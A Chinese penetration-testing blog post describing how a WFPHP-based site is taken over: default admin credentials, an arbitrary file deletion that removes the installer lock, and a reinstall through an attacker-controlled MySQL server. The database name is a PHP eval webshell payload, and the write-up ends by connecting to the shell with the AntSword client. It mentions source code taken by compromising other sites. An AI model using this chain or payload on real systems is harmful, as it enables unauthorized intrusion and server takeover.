---
title: "任意文件删除+重装漏洞导致getshell"
date: 2020-03-22T04:27:29+08:00
draft: false
tags: ['渗透实战']
categories: ['渗透测试']
---

任意文件删除+重装漏洞导致getshell
<!--more-->


## 踩点
网站长这样
![avatar](https://sqlmap.wiki/images/325-1.png)
这种网站一般都是生成的模板，生成一个单页。所以我们得找到后台来getshell。通过js文件得知这个网站用的是WFPHP，百度这个cms得知后台是/wforder/wfadmin/，并得到默认账号密码 admin 123456
![avatar](https://sqlmap.wiki/images/325-2.png)
![avatar](https://sqlmap.wiki/images/325-3.png)
![avatar](https://sqlmap.wiki/images/325-10.png)

## 开始渗透
进入后台之后，测了一些东西，没发现啥漏洞。同事通过日别的站把这套源码脱下来了，但是核心代码都被加密了。
![avatar](https://sqlmap.wiki/images/325-8.png)
浏览了一些结构，/wfinstall/是系统安装文件夹，不过因为有lock锁，具体位置在 /wfdata/wfinstall.lock，所以我们得找到一个任意文件删除漏洞，才能尝试getshell

在后台修改产品这里，找到个任意文件删除漏洞
![avatar](https://sqlmap.wiki/images/325-4.png)
![avatar](https://sqlmap.wiki/images/325-5.png)
可以看到，这里的路径是可控的，把路径改为lock文件地址进行删除
![avatar](https://sqlmap.wiki/images/325-6.png)
之后访问wfinstall进行重装。首先问好兄弟借了台支持外连的mysql服务器，创建了个数据库为
```
'.@eval($_POST[1]).'
```
之后填入我们外链muysql的信息
![avatar](https://sqlmap.wiki/images/325-9.png)
重装成功之后，蚁剑连接 http://test.com/wfinstall/index.php  getshell
![avatar]（https://sqlmap.wiki/images/325-11.png）